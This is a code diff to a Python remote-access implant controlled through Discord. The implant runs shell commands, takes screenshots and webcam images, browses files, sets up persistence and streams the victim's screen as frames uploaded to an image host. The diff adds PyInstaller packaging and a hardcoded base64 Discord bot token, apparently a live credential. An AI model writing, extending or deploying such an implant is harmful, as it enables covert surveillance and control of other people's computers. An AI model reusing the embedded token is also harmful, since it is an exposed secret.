@@ -7,6 +7,8 @@ import shlex
 import mss
 from PIL import Image
 import io
+import sys      # For PyInstaller pathing
+import base64   # For the fallback token
 
 # Import all other execution modules
 import command_executor as cmd; import notification_sender as notifier; import screenshot_taker as ss
@@ -15,8 +17,12 @@ import webcam_manager as wcm; import file_explorer as fe; import persistence_man
 import image_uploader
 
 # --- Configuration ---
-TOKEN_PATH = 'token.txt'; SERVER_CATEGORY_NAME = "🔴 Live Sessions"; INSTRUCTION_PREFIX = 'EXEC_CMD:'
+TOKEN_FILE_NAME = 'token.txt' # The name of the optional override file
+SERVER_CATEGORY_NAME = "🔴 Live Sessions"; INSTRUCTION_PREFIX = 'EXEC_CMD:'
 STREAM_FRAME_PREFIX = 'STREAM_FRAME:'; EMBED_COLOR = 0x2B2D31
+
+# MODIFIED: Your specific Base64 encoded fallback token is now hardcoded.
+FALLBACK_TOKEN_B64 = "TVRNNU5qVTNOekEyTXpNME1qY3dOalk1T0EuRzhoTjgzLmNDQ1U4bXRQbDVvRC1rUHJ2RWtiR0djY3E2RTM1TklUOTluTHdN"
 
 # --- Implant State ---
 is_streaming = False
@@ -24,9 +30,36 @@ is_streaming = False
 # --- Bot Setup & Helpers ---
 intents = discord.Intents.default(); intents.message_content = True
 client = discord.Client(intents=intents)
+
+def resource_path(relative_path):
+    """ Get absolute path to resource, works for dev and for PyInstaller """
+    try:
+        base_path = sys._MEIPASS
+    except Exception:
+        base_path = os.path.abspath(".")
+    return os.path.join(base_path, relative_path)
+
 def load_token():
-    if not os.path.exists(TOKEN_PATH): raise FileNotFoundError(f"Token file not found: {TOKEN_PATH}")
-    with open(TOKEN_PATH, 'r') as f: return f.read().strip()
+    """
+    Tries to load the token from token.txt, otherwise uses the hardcoded fallback.
+    """
+    token_file_path = resource_path(TOKEN_FILE_NAME)
+    try:
+        # Priority 1: Try to load from the external file if it exists.
+        with open(token_file_path, 'r') as f:
+            token = f.read().strip()
+            print(f"Successfully loaded token from override file: {TOKEN_FILE_NAME}.")
+            return token
+    except FileNotFoundError:
+        # Priority 2: If the file doesn't exist, use the hardcoded fallback.
+        print(f"'{TOKEN_FILE_NAME}' not found. Using hardcoded fallback token.")
+        try:
+            fallback_token = base64.b64decode(FALLBACK_TOKEN_B64).decode('utf-8')
+            return fallback_token
+        except Exception as e:
+            print(f"FATAL ERROR: Could not decode the fallback token. Is it valid Base64? Error: {e}")
+            raise
+
 def get_device_name():
     hostname = socket.gethostname(); return "".join(c for c in hostname.lower() if c.isalnum() or c == '-').strip()
 
@@ -89,7 +122,7 @@ async def on_message(message):
             else:raise Exception("Failed to capture webcam image.")
         elif command_name == "systemspecs":
             specs=sysinfo.get_specs();embed=Embed(title=f"💻 System Specs for {device_name}",color=discord.Color.blue());
-            embed.add_field(name="OS",value=f"{specs.get('platform','N/A')} {specs.get('platform_release','N/A')}",inline=False);embed.add_field(name="CPU",value=f"{specs.get('cpu_name','N/A')}",inline=False);embed.add_field(name="RAM",value=f"{specs.get('ram_usage_percent','N/A')}% used",inline=False);
+            embed.add_field(name="OS",value=f"{specs.get('platform','NA')} {specs.get('platform_release','N/A')}",inline=False);embed.add_field(name="CPU",value=f"{specs.get('cpu_name','N/A')}",inline=False);embed.add_field(name="RAM",value=f"{specs.get('ram_usage_percent','N/A')}% used",inline=False);
             await message.channel.send(embed=embed)
         elif command_name == "shownotification":
             t,m=shlex.split(args_str);s=notifier.show(t,m);msg="Success"if s else"Failure";
@@ -107,7 +140,7 @@ async def on_message(message):
     except Exception as e:
         await message.channel.send(embed=Embed(title="❌ Implant Error",description=f"On `{device_name}`:\n```py\n{e}\n```",color=discord.Color.red()))
 
-# --- Streaming Loop (REWRITTEN) ---
+# --- Streaming Loop ---
 async def stream_loop(channel):
     global is_streaming
     print("[IMPLANT] Starting screenshare stream...")
@@ -126,7 +159,6 @@ async def stream_loop(channel):
                 url = await asyncio.to_thread(image_uploader.upload_image, img_bytes.getvalue())
                 
                 if url:
-                    # The implant's ONLY job is to send the raw URL back to the C2.
                     await channel.send(f"{STREAM_FRAME_PREFIX}{url}")
                 
                 await asyncio.sleep(1.0) # Framerate control
